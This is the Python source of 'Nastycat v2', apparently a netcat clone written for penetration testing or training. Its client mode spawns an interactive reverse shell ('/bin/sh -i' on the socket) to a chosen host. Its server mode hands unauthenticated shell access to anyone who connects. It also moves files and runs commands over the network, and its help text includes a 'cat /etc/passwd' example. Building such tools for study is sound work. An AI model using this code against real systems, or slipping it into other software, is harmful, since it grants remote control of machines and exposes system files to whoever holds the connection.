#!/usr/bin/python3

import os
import sys
import time
import socket
import argparse
import threading
import subprocess

def execute(command):

	# function to execute commands on local system

	output = subprocess.getoutput(command)
	if command[:3] == 'cd ':
		os.chdir(command[3:].replace('\n', ''))
	
	return output + "\n"

def getoutput(soc):

	# function receives data from socket object and prints it

	while True:
		output = soc.recv(4096*4096).replace(b'\r',b'')
		try:
			out = output.decode()
		except UnicodeDecodeError:
			out = output
		if out:
			print(out, end='')

def shell(soc):

	# function that enables client to get local system shell access

	client, addr = soc.accept()
	print("[*] Received connection from {}".format(addr))
	print("[+] Shell access provided")
	while True:
		try:
			client.send(b'-> ')
			command = client.recv(4096*4096).decode()
			output = execute(command)
			client.send(output.encode())
		except BrokenPipeError:
			shell(soc) # calling itself in order to accept connection from another client if the previous one disconnects until the server is manualy killed

class Nastycat:
	def __init__(self, args):

		# initializing some objects

		self.args = args
		self.soc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

	def run(self):
		if self.args.listen:
			self.listen()

		else:
			self.remote()

	def listen(self):

		# server side function

		self.soc.bind((self.args.target, self.args.port))
		self.soc.listen(5)
		print('[+] Listening started on %s:%d' % (self.args.target, self.args.port))

		# started listening on given host and port

		if not self.args.execute:
			if not self.args.shell:
				# if execute and shell options are not provided then:
				client, addr = self.soc.accept()
				print("[*] Received connection from {}".format(addr))

		else:
			# when execute option is provided
			while True:
				client, addr = self.soc.accept()
				print("[*] Received connection from {}".format(addr))
				output = execute(self.args.execute)
				client.send(output.encode())
				client.close()

		if self.args.upload:

			# receiving client data

			data = b''
			while True:
				p = client.recv(4096*4096)
				data += p
				length = len(p)
				if length < 4096*4096:
					break

			# if data is present, then save it to given file
			
			if data:
				f = open(self.args.upload, "wb")
				f.write(data)
				client.send(b"File saved.\n")
				client.close()
				self.soc.close()
				print("[*] Received %d bytes from %s" % (len(data), addr))
				print("[+] File saved as %s" % self.args.upload)
				exit()

		elif self.args.shell:

			# provide client local shell access

			shell(self.soc)

		else:

			# if none of the above options are specified
			# this can also handle actual reverse shell connections

			try:

				# creating a worker thread to continiously print client data

				thread = threading.Thread(target=getoutput, args=(client,), daemon=True)
				thread.start()

				# main thread takes input and sends it to client.

				while True:
					command = input()
					if len(command) == 0 or command[-1] != '\n':
						command += '\n'
					client.send(command.encode())
					time.sleep(0.01) # sleeping is important to the proper working of functions as python itself has a fixed speed
			except BrokenPipeError:
				print("[+] Client has disconnected.")
				self.soc.close()
				nc = Nastycat(args) # again call the class to start listening for other clients if the previous one is disconnected
				nc.run()

	def remote(self):

		# client side function

		self.soc.settimeout(2)
		self.soc.connect((self.args.target, self.args.port))
		print("[+] Connected to %s:%d" % (self.args.target, self.args.port))
		self.soc.settimeout(None)

		# timeout error is only for unstabilished connection timeout

		if self.args.upload:

			# opens given file and sends its contents to the server

			f = open(self.args.upload, 'rb')
			contents = f.read()
			self.soc.send(contents)
			print(self.soc.recv(4096*4096).decode())
			self.soc.close()
			f.close()

		elif self.args.execute:

			# executes a command and sends output to the server

			output = execute(self.args.execute)
			self.soc.send(output.encode())
			print(self.soc.recv(4096*4096).decode())
			self.soc.close()

		elif self.args.shell:

			# provides an actual local reverse shell to the server
			# Note - this only works when host machine is linux or mac

			os.dup2(self.soc.fileno(), 0)
			os.dup2(self.soc.fileno(), 1)
			os.dup2(self.soc.fileno(), 2)
			subprocess.call(['/bin/sh', '-i'])

		else:

			# when no above options are provided

			# creating a worker thread to continiously print server data

			thread = threading.Thread(target=getoutput, args=(self.soc,), daemon=True)
			thread.start()

			# this tells if something is piped in the runtime
			# if yes, then it is read through stdin
			# EOF is automatically sent during piping

			isatty = not os.isatty(sys.stdin.fileno())
			while True:
				if isatty:
					command = sys.stdin.read()

				# if no piping has happened, read input normally
				
				else:
					command = input()

				if len(command) != 0 and command[-1] != '\n':
					command += '\n'

				if command:
					try:
						self.soc.send(command.encode())
					except BrokenPipeError:
						self.soc.close()
						exit()

if __name__ == '__main__':

	# creating our arguments

	parser = argparse.ArgumentParser(description='Nastycat v2', formatter_class=argparse.RawDescriptionHelpFormatter, add_help=False, epilog='''Example:
  ./%(prog)s 192.168.3.41 -p 4444 # connect to server at port 4444.
  ./%(prog)s -lp 4444 # listen on port 4444 for possible reverse connection.
  ./%(prog)s -lu output.txt # receive client data and save it in specified file.
  ./%(prog)s -le "cat /etc/passwd" # executes the command and sends output to client.''')

	parser._positionals.title = 'positionals'
	parser._optionals.title = 'optionals'

	parser.add_argument('-h', '--help', action='help', help='Shows the help message.')
	parser.add_argument(metavar='target', dest='target', help='Target host. (default - 0.0.0.0)', nargs='?', default='0.0.0.0')
	parser.add_argument(metavar='port', type=int, dest='port', help='Target port. (default - 4444)', default=4444, nargs='?')
	parser.add_argument('-l', '--listen', action='store_true', help='Invokes listening mode.')
	parser.add_argument('-s', '--shell', action='store_true', help='Invokes forward shell mode.')
	parser.add_argument('-u', '--upload', metavar='', help='Invokes uploading mode.')
	parser.add_argument('-e', '--execute', help='Invokes execute mode.', metavar='')

	args = parser.parse_args()

	if os.name == 'nt':
		# this script is not appropriate for windows as a local machine
		sys.stderr.write('[!] Warning: Not appropriate for windows.\n')

	nc = Nastycat(args)
	try:
		nc.run()
	except KeyboardInterrupt:
		print()
		exit()